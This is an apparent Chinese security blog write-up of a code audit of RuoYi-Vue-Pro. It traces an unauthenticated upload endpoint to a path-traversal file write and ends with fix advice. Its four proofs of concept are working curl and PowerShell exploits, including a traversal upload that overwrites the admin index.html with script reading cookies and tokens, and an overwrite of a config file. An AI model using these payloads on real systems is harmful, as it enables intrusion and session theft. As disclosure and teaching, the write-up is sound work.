---
title: 审了个百k项目，没想到真出洞了 | RuoYi-Vue-Pro 任意文件上传 & 路径穿越
cover: >-
  https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141041638.png
categories:
  - [实战, 代码审计]
tags:
  - 代码审计
  - Java
  - SpringBoot
  - RuoYi
  - 文件上传
  - 路径穿越
abbrlink: e1f2g3h4
date: 2026-06-02 17:00:00
---
# 审了个百k项目，没想到真出洞了 | RuoYi-Vue-Pro 任意文件上传 & 路径穿越

> 漏洞状态：已修复

---

## 目录

- [项目背景](#项目背景)
- [入口定位：AppFileController](#入口定位appfilecontroller)
- [追踪 /upload 接口](#追踪-upload-接口)
- [调用链跟踪：createFile → generateUploadPath](#调用链跟踪createfile--generateuploadpath)
- [sink 确认：LocalFileClient 无过滤写文件](#sink-确认localfileclient-无过滤写文件)
- [漏洞复现](#漏洞复现)
  - [POC 1：无认证文件上传](#poc-1无认证文件上传)
  - [POC 2：路径穿越写入任意目录](#poc-2路径穿越写入任意目录)
  - [POC 3：覆盖前端页面实现持久化 XSS](#poc-3覆盖前端页面实现持久化-xss)
  - [POC 4：写入应用配置目录](#poc-4写入应用配置目录)
- [总结](#总结)

---

## 项目背景

百k star 的开源项目还能审出洞吗？这次拿 RuoYi-Vue-Pro 试试。

文件有点多，先让 AI 把项目结构梳理一遍再说。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141014520.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141016926.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141019138.png)

搭建过程省略，直接进入审计。

---

## 入口定位：AppFileController

目标文件：

```
yudao-module-infra/src/main/java/cn/iocoder/yudao/module/infra/controller/app/file/AppFileController.java
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141021046.png)

这个 Controller 里有三个接口：`/create`、`/presigned-url`、`/upload`。

先看 `@PermitAll` 注解——这个注解的意思是允许所有人访问，包括未登录用户。所以 `/upload` 和 `/create` 两个接口都不需要登录就能访问。

不过这里需要注意一下：**漏洞的重点不是未授权本身**，未授权只是让漏洞的攻击门槛更低，真正的问题在后面的路径处理逻辑上。

---

## 追踪 /upload 接口

先看 `/upload`，方法参数是 `AppFileUploadReqVO uploadReqVO`。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141023684.png)

看一下 `AppFileUploadReqVO` 里有什么——两个字段 `directory` 和 `file`，还有一个方法。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141026023.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141028367.png)

看 `directory` 和 `file` 的获取方式：**两个都是直接通过 getter 获取的**，意味着 HTTP 请求时这两个参数完全可控，没有任何预处理。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141030052.png)

`uploadFile` 的核心逻辑很简单：读取 `file` 转换成字节数据 `content`，然后直接调用：

```java
return success(fileService.createFile(
    content,
    file.getOriginalFilename(),
    uploadReqVO.getDirectory(),
    file.getContentType()
));
```

`directory` 原样传进去，没有任何过滤。

---

## 调用链跟踪：createFile → generateUploadPath

跟进 `fileService.createFile`。`FileService` 是接口，找到实现类 `FileServiceImpl`：

```java
public class FileServiceImpl implements FileService
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141032089.png)

在 `FileServiceImpl` 的 `createFile` 方法里，最终的路径生成在这一行被定下来：

```java
String path = generateUploadPath(name, directory);
```

继续跟进 `generateUploadPath`：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141034670.png)

核心代码如下：

```java
if (StrUtil.isNotEmpty(prefix)) {
    name = prefix + StrUtil.SLASH + name;
}
// 2.3 最后拼接 directory 目录
if (StrUtil.isNotEmpty(directory)) {
    name = directory + StrUtil.SLASH + name;
}
```

- `prefix` = 日期字符串，比如 `20260601`
- `StrUtil.SLASH` = 路径分隔符 `/`

最终路径结构：`directory/prefix/filename`，也就是 **基础目录/日期目录/文件名**。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141037051.png)

看这段代码能得出几个结论：

- 第一行是 `path` 的生成
- 第二部分是保存文件的方法
- 第三部分还把保存的 URL 路径存入了数据库，**并且把 URL 直接返回给了调用方**

这意味着上传成功后可以直接从响应包里拿到写入路径——回显完美。

更关键的是：**`directory` 可控，而且路径拼接没有任何过滤**，`../` 这种穿越字符直接能用。

---

## sink 确认：LocalFileClient 无过滤写文件

继续往下追，关键调用：

```java
String url = client.upload(content, path, type);
```

`FileClient` 是接口，先找到 `AbstractFileClient`，但它依然是抽象方法，继续往下找继承类：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141039502.png)

有五个实现类，根据代码上下文（本地存储场景），找到 `LocalFileClient`：

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141041638.png)

`LocalFileClient` 里确实有 `upload` 方法，核心就一行：

```java
FileUtil.writeBytes(content, filePath); // 写入文件
```

跳进去看 `filePath` 的来源：

```java
String filePath = getFilePath(path);
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141044415.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141046472.png)

**没有任何过滤，路径直接拼接写入。**

整条调用链打通：

```
HTTP 请求 directory 参数（可控）
    → AppFileController.uploadFile()
    → FileServiceImpl.createFile()
    → generateUploadPath()  // directory 原样拼入 path
    → LocalFileClient.upload()
    → FileUtil.writeBytes(content, filePath)  // 无过滤写文件
```

漏洞确认：**无认证任意文件上传 + 路径穿越写任意文件**。

---

## 漏洞复现

### 环境

| 项目 | 值 |
|------|-----|
| 目标地址 | `http://localhost:28080` |
| 存储类型 | Local（id=36） |
| basePath | `E:/download/ruoyi-vue-pro-master/upload` |
| 认证要求 | 无需任何 Cookie、Token 或认证头 |

---

### POC 1：无认证文件上传

```bash
curl -X POST "http://localhost:28080/app-api/infra/file/upload" \
  -H "tenant-id: 1" \
  -F "file=@C:\Windows\win.ini" \
  -F "directory=test"
```

**响应**（`code=0` 表示成功）：

```json
{"code":0,"msg":"","data":"http://localhost:28080/admin-api/infra/file/36/get/test/20260528/win.ini"}
```

**实测输出：**

```
C:\Users\t> curl -X POST "http://localhost:28080/app-api/infra/file/upload" -H "tenant-id: 1" -F "file=@C:\Windows\win.ini" -F "directory=test"
{"code":0,"msg":"","data":"http://localhost:28080/admin-api/infra/file/36/get/test/20260528/win.ini"}
```

文件被写入 `{basePath}/test/20260528/win.ini`，URL 在响应中直接回显。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141048657.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141050789.png)

---

### POC 2：路径穿越写入任意目录

把 `directory` 换成 `../../../test`：

```bash
curl -X POST "http://localhost:28080/app-api/infra/file/upload" \
  -H "tenant-id: 1" \
  -F "file=@C:\Windows\win.ini" \
  -F "directory=../../../test"
```

**响应：**

```json
{"code":0,"msg":"","data":"http://localhost:28080/admin-api/infra/file/36/get/../../../test/20260528/win.ini"}
```

**文件实际写入位置：** `E:/test/20260528/win.ini`

已绕过 `basePath` 限制，穿越到了磁盘根目录级别。

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141052631.png)

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141055332.png)

---

### POC 3：覆盖前端页面实现持久化 XSS

这个 POC 的思路是利用路径穿越 + 文件名中的 `../` 来精确覆盖目标文件，把管理后台的 `index.html` 替换成恶意页面。

路径解析过程：

```
{basePath}/../yudao-ui/yudao-ui-admin-vue3-full/20260528/../index.html
    → E:/download/.../yudao-ui/yudao-ui-admin-vue3-full/index.html
```

**技巧说明：** `directory` 控制往上穿越几级目录，`filename` 里的 `../` 可以抵消 `generateUploadPath` 自动加入的日期目录（`prefix`），这样两个参数配合就能精确命中目标路径。

**POC 步骤：**

```powershell
# 1. 准备恶意 HTML（窃取 cookie + 管理员数据）
@"
<html><body><script>
alert('XSS: ' + document.cookie);
fetch('http://localhost:28080/admin-api/system/user/get-user-profile', {
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('accessToken') }
}).then(r=>r.json()).then(d=>{alert('Admin data: ' + JSON.stringify(d))});
</script></body></html>
"@ | Set-Content -Path "$env:TEMP\xss.html" -Encoding ASCII

# 2. 通过路径穿越上传，覆盖 index.html
curl -X POST "http://localhost:28080/app-api/infra/file/upload" \
  -H "tenant-id: 1" \
  -F "file@=$env:TEMP\xss.html;filename=..\index.html" \
  -F "directory=..\yudao-ui\yudao-ui-admin-vue3-full"
```

**实测结果：** 访问 `http://localhost:1024` 弹出 XSS 告警，成功读取到当前域名下的 cookie：

```
XSS: Hm_lvt_a1ff8825baa73c3a78aa96aa40325abc=1779948387;
     HMACCOUNT=9619F6BEBF84EB12;
     Hm_lpvt_a1ff8825baa73c3a78eb96aa40325abc=1779951192
```

![](https://raw.githubusercontent.com/wr0ld/BlogImage/main//img/20260602141057455.png)

Vite 开发服务器检测到文件变更后自动热重载，管理后台页面被完全替换。

攻击者可以进一步将恶意 JavaScript 注入 `.vue` 文件，实现：

- 窃取管理员 Session/Token（`localStorage.accessToken`）
- 钓鱼获取管理员密码
- 篡改业务数据展示

---

### POC 4：写入应用配置目录

```bash
curl -X POST "http://localhost:28080/app-api/infra/file/upload" \
  -H "tenant-id: 1" \
  -F "file=@evil-application.yaml;filename=application-local.yaml" \
  -F "directory=..\..\yudao-server\src\main\resources"
```

这个方式可以尝试覆盖 Spring Boot 的配置文件。能否影响运行时配置，取决于部署方式、配置加载优先级和服务重启条件——如果应用使用外部化配置且有热加载，危害会进一步升级。

---

## 总结

这次从 `AppFileController` 出发，顺着调用链一路追到 `LocalFileClient.upload()` 的 `FileUtil.writeBytes()`，整条链路下来基本没有遇到任何过滤，路径拼接逻辑上 `directory` 参数直接可控。

**漏洞成因：**

- `/upload` 接口加了 `@PermitAll`，无需认证即可调用
- `directory` 参数从请求直接传入，全程未做路径规范化（`Path.normalize()` / `Paths.get().toRealPath()` 之类的操作都没有）
- 最终调用的 `FileUtil.writeBytes()` 是纯粹的文件写入，sink 完全无防御

**利用链：** 无认证上传 → `directory` 路径穿越 → 任意文件写入 → 覆盖前端页面持久化 XSS / 覆盖配置文件

**修复建议（参考）：**

- 对 `directory` 参数做白名单或路径规范化，拒绝包含 `../`、`..\\` 的输入
- 用 `Paths.get(basePath).resolve(directory).normalize()` 之后校验是否还在 `basePath` 内
- 文件名同理，`getOriginalFilename()` 取到的值要去掉路径分隔符

目前官方已修复，感兴趣的可以去 commit 记录里看具体的修复方式。
